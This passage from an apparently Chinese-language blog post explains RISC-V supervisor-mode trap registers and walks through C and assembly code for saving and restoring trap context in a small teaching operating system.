<li>当接收到<code>trap</code>时，如果该<code>trap</code>来自用户模式，则<code>SPP</code>设置为<code>0</code>，否则设置为<code>1</code>。</li>
<li>当执行一条<code>SRET</code>指令从<code>trap</code>处理程序返回时，如果<code>SPP</code>位为<code>0</code>，则特权级别被设置为<code>U</code>模式，如果<code>SPP</code>位为<code>1</code>，则特权级别被设置为<code>S</code>模式</li>
</ul>
<h3 id="Supervisor-Trap-Vector-Base-Address-Register-stvec"><a href="#Supervisor-Trap-Vector-Base-Address-Register-stvec" class="headerlink" title="Supervisor Trap Vector Base Address Register (stvec)"></a>Supervisor Trap Vector Base Address Register (<code>stvec</code>)</h3><p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612155330823.png" alt="image-20240612155330823"></p>
<p><code>stvec</code>寄存器用于设置发生<code>trap</code>时，异常处理程序的地址。</p>
<ul>
<li>MODE 位于 [1:0]，长度为 2 bits；<ul>
<li>当mode 字段为0时，<code>stvec</code> 被设置为 Direct 模式，此时进入 S 模式的 Trap 无论原因如何，处理 Trap 的入口地址都是 <code>BASE&lt;&lt;2</code> ，CPU 会跳转到这个地方进行异常处理。</li>
<li>当字段为1时，异常触发后会跳转到以<code>BASE</code>字段对应的异常向量表，每个向量占4个字节。</li>
</ul>
</li>
<li>BASE 位于 [63:2]，长度为 62 bits。</li>
</ul>
<h3 id="Supervisor-Scratch-Register-sscratch"><a href="#Supervisor-Scratch-Register-sscratch" class="headerlink" title="Supervisor Scratch Register (sscratch)"></a>Supervisor Scratch Register (sscratch)</h3><p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612155754188.png" alt="image-20240612155754188"></p>
<p>sscratch寄存器是一个可读&#x2F;写的辅助寄存器，通常，在hart执行用户代码时，<strong>sscratch用于切换上下文的栈。</strong></p>
<h3 id="Supervisor-Exception-Program-Counter-sepc"><a href="#Supervisor-Exception-Program-Counter-sepc" class="headerlink" title="Supervisor Exception Program Counter (sepc)"></a>Supervisor Exception Program Counter (<code>sepc</code>)</h3><p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612160219204.png" alt="image-20240612160219204"></p>
<p><strong>sepc记录了 Trap 发生之前执行的最后一条指令的地址</strong></p>
<h3 id="Supervisor-Cause-Register-scause-star"><a href="#Supervisor-Cause-Register-scause-star" class="headerlink" title="Supervisor Cause Register (scause):star:"></a>Supervisor Cause Register (<code>scause</code>):star:</h3><p> <img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240612160323835.png" alt="image-20240612160323835"></p>
<p>这个寄存器记录了S模式下异常发生的原因。</p>
<ul>
<li>最高位<code>interrupt</code>为<code>1</code>的时候表示触发的类型为中断，为<code>0</code>的时候表示异常</li>
<li>其余位表示具体的trap原因Exception Code</li>
</ul>
<table>
<thead>
<tr>
<th>Interrupt</th>
<th>Exception Code</th>
<th>Description</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>Supervisor software interrupt</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>2–4</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>5</td>
<td>Supervisor timer interrupt</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>6–8</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>9</td>
<td>Supervisor external interrupt</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>10–15</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>≥16</td>
<td><em>Designated for platform use</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>Instruction address misaligned</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>Instruction access fault</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>2</td>
<td>Illegal instruction</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>3</td>
<td>Breakpoint</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>4</td>
<td>Load address misaligned</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>5</td>
<td>Load access fault</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>6</td>
<td>Store&#x2F;AMO address misaligned</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>7</td>
<td>Store&#x2F;AMO access fault</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>8</td>
<td>Environment call from U-mode</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>9</td>
<td>Environment call from S-mode</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>10–11</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>12</td>
<td>Instruction page fault</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>13</td>
<td>Load page fault</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>14</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>15</td>
<td>Store&#x2F;AMO page fault</td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>16–23</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>24–31</td>
<td><em>Designated for custom use</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>32–47</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>48–63</td>
<td><em>Designated for custom use</em></td>
<td></td>
</tr>
<tr>
<td>0</td>
<td>≥64</td>
<td><em>Reserved</em></td>
<td></td>
</tr>
</tbody></table>
<h2 id="特权级切换流程机制"><a href="#特权级切换流程机制" class="headerlink" title="特权级切换流程机制"></a>特权级切换流程机制</h2><p>当cpu准备从 U特权级 trap 到 S特权级的时候，会执行如下流程：</p>
<ol>
<li><code>sstatus</code> 的 <code>SPP</code> 字段会被修改为 <code>CPU</code> 当前的特权级<code>（U/S）</code>。</li>
<li><code>sepc</code> 会被修改为 <code>Trap</code> 处理完成后默认会执行的下一条指令的地址。</li>
<li><code>scause/stval</code> 分别会被修改成这次 <code>Trap</code> 的原因以及相关的附加信息。</li>
<li><code>CPU</code> 会跳转到 <code>stvec</code> 所设置的 <code>Trap</code> 处理入口地址，并将当前特权级设置为 <code>S</code> ，然后从<code>Trap</code> 处理入口地址处开始执行。这里会根据<code>scause</code>中保存的异常原因进行分发处理</li>
</ol>
<p>当CPU完成trap 准备返回到 U特权级的时候，需要通过 一条S特权级的指令 <code>sret</code>来完成：</p>
<ol>
<li>CPU 会将当前的特权级按照 <code>sstatus</code> 的 <code>SPP</code> 字段设置为 U 或者 S ；</li>
<li>CPU 会跳转到 <code>sepc</code> 寄存器指向的那条指令，然后继续执行。  <code>sepc</code>保存了trap之前待执行的下一条指令</li>
</ol>
<p>上下文的保存和恢复需要用到栈空间</p>
<ul>
<li>应用程序通过 <code>ecall</code> 进入到内核状态时，操作系统保存被打断的应用程序的 <code>Trap</code> 上下文；</li>
<li>操作系统根据<code>Trap</code>相关的<code>CSR</code>寄存器内容，完成系统调用服务的分发与处理；</li>
<li>操作系统完成系统调用服务后，需要恢复被打断的应用程序的<code>Trap</code> 上下文，并通 <code>sret</code> 让应用程序继续执行。</li>
</ul>
<h1 id="3-trap机制实现"><a href="#3-trap机制实现" class="headerlink" title="3.trap机制实现"></a>3.trap机制实现</h1><blockquote>
<p>OS&#x2F;types.h</p>
<p>实现一个数据类型的定义，用<code>typedef</code>定义了一个<code>reg_t</code>的类型用于定义使用的寄存器</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __TYPES_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TYPES_H__</span></span><br><span class="line"><span class="comment">// 定义无符号整型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span>  <span class="type">uint32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * RISCV64: 寄存器的大小是64位的</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> <span class="type">reg_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;riscv.h</p>
<p>定义了一些获取寄存器值的函数</p>
<p>需要在os.h 中 加入 types.h的头文件</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __RISCV_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __RISCV_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="comment">/* 读取 sepc 寄存器的值 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_sepc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, sepc&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* scause 记录了异常原因 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_scause</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, scause&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// stval 记录了trap发生时的地址</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_stval</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, stval&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* sstatus记录S模式下处理器内核的运行状态*/</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_sstatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, sstatus&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>  <span class="title function_">w_sstatus</span><span class="params">(<span class="type">reg_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw sstatus, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* stvec寄存器 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>  <span class="title function_">w_stvec</span><span class="params">(<span class="type">reg_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw stvec, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_stvec</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, stvec&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;batch.c</p>
<p>在这个文件中 定义内核栈和用户栈，内核栈可以用来保存 trap情况下的用户程序上下文</p>
<p><code>KernelStack</code>和<code>UserStack</code>的大小被定义为8kb。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE (4096 * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> KernelStack[KERNEL_STACK_SIZE];</span><br><span class="line"><span class="type">uint8_t</span> UserStack[USER_STACK_SIZE];</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;context.h</p>
<p>用来保存上下文寄存器信息，Trap上下文执行流的数据就是寄存器中的数据，有<code>x0~x31</code>总共<code>32</code>个通用寄存器以及<code>sstatus</code>和<code>sepc</code>等控制寄存器需要保存。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __CONTEXT_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __CONTEXT_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="comment">/*S模式的trap上下文*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line">	<span class="type">reg_t</span> x0;</span><br><span class="line">	<span class="type">reg_t</span> ra;</span><br><span class="line">	<span class="type">reg_t</span> sp;</span><br><span class="line">	<span class="type">reg_t</span> gp;</span><br><span class="line">	<span class="type">reg_t</span> tp;</span><br><span class="line">	<span class="type">reg_t</span> t0;</span><br><span class="line">	<span class="type">reg_t</span> t1;</span><br><span class="line">	<span class="type">reg_t</span> t2;</span><br><span class="line">	<span class="type">reg_t</span> s0;</span><br><span class="line">	<span class="type">reg_t</span> s1;</span><br><span class="line">	<span class="type">reg_t</span> a0;</span><br><span class="line">	<span class="type">reg_t</span> a1;</span><br><span class="line">	<span class="type">reg_t</span> a2;</span><br><span class="line">	<span class="type">reg_t</span> a3;</span><br><span class="line">	<span class="type">reg_t</span> a4;</span><br><span class="line">	<span class="type">reg_t</span> a5;</span><br><span class="line">	<span class="type">reg_t</span> a6;</span><br><span class="line">	<span class="type">reg_t</span> a7;</span><br><span class="line">	<span class="type">reg_t</span> s2;</span><br><span class="line">	<span class="type">reg_t</span> s3;</span><br><span class="line">	<span class="type">reg_t</span> s4;</span><br><span class="line">	<span class="type">reg_t</span> s5;</span><br><span class="line">	<span class="type">reg_t</span> s6;</span><br><span class="line">	<span class="type">reg_t</span> s7;</span><br><span class="line">	<span class="type">reg_t</span> s8;</span><br><span class="line">	<span class="type">reg_t</span> s9;</span><br><span class="line">	<span class="type">reg_t</span> s10;</span><br><span class="line">	<span class="type">reg_t</span> s11;</span><br><span class="line">	<span class="type">reg_t</span> t3;</span><br><span class="line">	<span class="type">reg_t</span> t4;</span><br><span class="line">	<span class="type">reg_t</span> t5;</span><br><span class="line">	<span class="type">reg_t</span> t6;</span><br><span class="line">	<span class="comment">/* S模式下的寄存器 */</span></span><br><span class="line">	<span class="type">reg_t</span> sstatus;</span><br><span class="line">	<span class="type">reg_t</span> sepc;</span><br><span class="line">&#125;pt_regs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;kerneltrap.S</p>
<p>汇编文件中定义了两个函数：：<code>__alltraps 、__restore</code></p>
<p><strong>用于对trap的上下文进行保存和恢复</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># __alltraps 函数：</span><br><span class="line">.globl __alltraps</span><br><span class="line">.align 4   #4*4 = 16字节对齐</span><br><span class="line">__alltraps:</span><br><span class="line">    # 从sscratch获取S模式下的SP，把U模式下的SP保存到sscratch寄存器中</span><br><span class="line">    csrrw sp, sscratch, sp</span><br><span class="line">    # now sp-&gt;kernel stack, sscratch-&gt;user stack</span><br><span class="line">    # allocate a TrapContext on kernel stack</span><br><span class="line">    addi sp, sp, -34*8</span><br><span class="line">    # save general-purpose registers</span><br><span class="line">    sd x1, 1*8(sp)</span><br><span class="line">    # skip sp(x2), we will save it later</span><br><span class="line">    sd x3, 3*8(sp)</span><br><span class="line">    # skip tp(x4), application does not use it</span><br><span class="line">    # save x5~x31</span><br><span class="line">    sd x4, 4*8(sp)   #sd xN, N*8(sp)：将通用寄存器 xN 的值存储到堆栈上 sp + N*8 的位置。</span><br><span class="line">    sd x5, 5*8(sp)</span><br><span class="line">    sd x6, 6*8(sp)</span><br><span class="line">    sd x7, 7*8(sp)</span><br><span class="line">    sd x8, 8*8(sp)</span><br><span class="line">    sd x9, 9*8(sp)</span><br><span class="line">    sd x10,10*8(sp)</span><br><span class="line">    sd x11, 11*8(sp)</span><br><span class="line">    sd x12, 12*8(sp)</span><br><span class="line">    sd x13, 13*8(sp)</span><br><span class="line">    sd x14, 14*8(sp)</span><br><span class="line">    sd x15, 15*8(sp)</span><br><span class="line">    sd x16, 16*8(sp)</span><br><span class="line">    sd x17, 17*8(sp)</span><br><span class="line">    sd x18, 18*8(sp)</span><br><span class="line">    sd x19, 19*8(sp)</span><br><span class="line">    sd x20, 20*8(sp)</span><br><span class="line">    sd x21, 21*8(sp)</span><br><span class="line">    sd x22, 22*8(sp)</span><br><span class="line">    sd x23, 23*8(sp)</span><br><span class="line">    sd x24, 24*8(sp)</span><br><span class="line">    sd x25, 25*8(sp)</span><br><span class="line">    sd x26, 26*8(sp)</span><br><span class="line">    sd x27, 27*8(sp)</span><br><span class="line">    sd x28, 28*8(sp)</span><br><span class="line">    sd x29, 29*8(sp)</span><br><span class="line">    sd x30, 30*8(sp)</span><br><span class="line">    sd x31, 31*8(sp)</span><br><span class="line"></span><br><span class="line">    # we can use t0/t1/t2 freely, because they were saved on kernel stack</span><br><span class="line">    csrr t0, sstatus</span><br><span class="line">    csrr t1, sepc</span><br><span class="line">    sd t0, 32*8(sp)</span><br><span class="line">    sd t1, 33*8(sp)</span><br><span class="line">    # read user stack from sscratch and save it on the kernel stack</span><br><span class="line">    csrr t2, sscratch</span><br><span class="line">    sd t2, 2*8(sp)</span><br><span class="line">    # set input argument of trap_handler(TrapContext)</span><br><span class="line">    mv a0, sp</span><br><span class="line">    call trap_handler</span><br></pre></td></tr></table></figure>

<p><code>__alltraps </code>函数就是发生异常时的处理函数，在此函数中：</p>
<ul>
<li><code>csrrw sp, sscratch, sp</code>中将<code>sscratch</code>和<code>sp</code>的值进行了交换，<ul>
<li>在进入此函数之前<code>sp</code>指向的是用户栈，<code>sscratch</code>中的值保存的是内核栈的栈顶。</li>
<li>进行交换后，由于此时进入了<code>S</code>态，所以需要切换栈，<strong>由此就切换到了内核栈。</strong></li>
</ul>
</li>
<li>然后就是将寄存器的值保存进内核栈中，在<code>context.h</code>上下文的定义可以看见<code>pt_regs</code>中定义了<code>34</code>个寄存器，所以通过<code>addi sp, sp, -34*8</code>指令来压栈，然后依次保存寄存器的值</li>
<li>最后两行将内核栈的<code>sp</code>保存进<code>a0</code>寄存器用于传参，所以将用户态寄存器保存进内核栈后，调用了<code>trap_handler</code>函数，在此函数中可通过<code>a0</code>传入的参数访问内核栈中储存的寄存器的值。</li>
</ul>
<p><code>__restore</code>函数：将内核栈中的存储的寄存器的值恢复，然后通过<code>sret</code>指令返回从S态到用户态继续执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.globl __restore</span><br><span class="line">.align 4</span><br><span class="line">__restore:</span><br><span class="line">    # case1: start running app by __restore</span><br><span class="line">    # case2: back to U after handling trap</span><br><span class="line">    mv sp, a0</span><br><span class="line">    # now sp-&gt;kernel stack(after allocated), sscratch-&gt;user stack</span><br><span class="line">    # restore sstatus/sepc</span><br><span class="line">    ld t0, 32*8(sp)</span><br><span class="line">    ld t1, 33*8(sp)</span><br><span class="line">    ld t2, 2*8(sp)</span><br><span class="line">    csrw sstatus, t0</span><br><span class="line">    csrw sepc, t1</span><br><span class="line">    csrw sscratch, t2</span><br><span class="line">    # restore general-purpuse registers except sp/tp</span><br><span class="line">    ld x1, 1*8(sp)</span><br><span class="line">    ld x3, 3*8(sp)</span><br><span class="line">    ld x4, 4*8(sp)</span><br><span class="line">    ld x5, 5*8(sp)</span><br><span class="line">    ld x6, 6*8(sp)</span><br><span class="line">    ld x7, 7*8(sp)</span><br><span class="line">    ld x8, 8*8(sp)</span><br><span class="line">    ld x9, 9*8(sp)</span><br><span class="line">    ld x10,10*8(sp)</span><br><span class="line">    ld x11, 11*8(sp)</span><br><span class="line">    ld x12, 12*8(sp)</span><br><span class="line">    ld x13, 13*8(sp)</span><br><span class="line">    ld x14, 14*8(sp)</span><br><span class="line">    ld x15, 15*8(sp)</span><br><span class="line">    ld x16, 16*8(sp)</span><br><span class="line">    ld x17, 17*8(sp)</span><br><span class="line">    ld x18, 18*8(sp)</span><br><span class="line">    ld x19, 19*8(sp)</span><br><span class="line">    ld x20, 20*8(sp)</span><br><span class="line">    ld x21, 21*8(sp)</span><br><span class="line">    ld x22, 22*8(sp)</span><br><span class="line">    ld x23, 23*8(sp)</span><br><span class="line">    ld x24, 24*8(sp)</span><br><span class="line">    ld x25, 25*8(sp)</span><br><span class="line">    ld x26, 26*8(sp)</span><br><span class="line">    ld x27, 27*8(sp)</span><br><span class="line">    ld x28, 28*8(sp)</span><br><span class="line">    ld x29, 29*8(sp)</span><br><span class="line">    ld x30, 30*8(sp)</span><br><span class="line">    ld x31, 31*8(sp)</span><br><span class="line"></span><br><span class="line">    # release TrapContext on kernel stack</span><br><span class="line">    addi sp, sp, 34*8</span><br><span class="line">    # now sp-&gt;kernel stack, sscratch-&gt;user stack  交换内核态和用户态的指针</span><br><span class="line">    csrrw sp, sscratch, sp</span><br><span class="line">    # now sp-&gt;user stack, sscratch-&gt;kernel stack  返回</span><br><span class="line">    sret</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__restore</code>函数的定义为<code>__restore(pt_regs *next)</code>，所以在第一行传入内核栈地址，然后将内核栈中存放的寄存器的值恢复，然后切换<code>sp</code>，最后通过<code>sret</code>返回用户态继续执行</li>
<li>在最后两行会将<code>sp</code>指向用户栈，<code>sscratch</code>指向内核栈</li>
</ul>
<h1 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h1><blockquote>
<p>OS&#x2F;trap.c</p>
<p>在汇编文件中的<code>__alltraps</code>中调用了中断处理函数<code>trap_handler</code>对异常进行处理，下面时对这个函数的简单实现</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;context.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;riscv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __alltraps(<span class="type">void</span>);</span><br><span class="line"></span><br><span class="line">pt_regs* <span class="title function_">trap_handler</span><span class="params">(pt_regs* cx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">reg_t</span> scause = r_scause() ;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cause:%x\n&quot;</span>,scause);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a0:%x\n&quot;</span>,cx-&gt;a0);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a1:%x\n&quot;</span>,cx-&gt;a1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a2:%x\n&quot;</span>,cx-&gt;a2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a7:%x\n&quot;</span>,cx-&gt;a7);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sepc:%x\n&quot;</span>,cx-&gt;sepc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sstatus:%x\n&quot;</span>,cx-&gt;sstatus);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sp:%x\n&quot;</span>,cx-&gt;sp);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> cx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trap_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 设置 trap 时调用函数的基地址</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	w_stvec((<span class="type">reg_t</span>)__alltraps);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>pt_regs* cx</code> 是一个指向 <code>pt_regs</code> 结构体的指针，<strong>包含了所有保存的寄存器值（上下文）</strong></li>
<li><code>r_scause()</code> 函数读取 <code>scause</code> 寄存器，获取 Trap 的原因。</li>
<li><code>trap_init</code> 函数用于初始化 Trap 机制，设置 Trap 向量基地址为 <code>__alltraps</code></li>
</ul>
<blockquote>
<p>OS&#x2F;batch.c</p>
<p>完整代码</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;context.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_BASE_ADDRESS 0x80600000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">syscall</span><span class="params">(<span class="type">size_t</span> id, <span class="type">reg_t</span> arg1, <span class="type">reg_t</span> arg2, <span class="type">reg_t</span> arg3)</span> &#123;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a7, %1\n\t&quot;</span>   <span class="comment">// Move syscall id to a0 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a0, %2\n\t&quot;</span>   <span class="comment">// Move args[0] to a1 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a1, %3\n\t&quot;</span>   <span class="comment">// Move args[1] to a2 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a2, %4\n\t&quot;</span>   <span class="comment">// Move args[2] to a3 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ecall\n\t&quot;</span>       <span class="comment">// Perform syscall</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv %0, a0&quot;</span>       <span class="comment">// Move return value to &#x27;ret&#x27; variable</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=r&quot;</span> (ret)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;r&quot;</span> (id), <span class="string">&quot;r&quot;</span> (arg1), <span class="string">&quot;r&quot;</span> (arg2), <span class="string">&quot;r&quot;</span> (arg3)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;a7&quot;</span>, <span class="string">&quot;a0&quot;</span>, <span class="string">&quot;a1&quot;</span>, <span class="string">&quot;a2&quot;</span>, <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testsys</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// //int len = strlen(message);</span></span><br><span class="line">    <span class="comment">//reg_t sstatus = 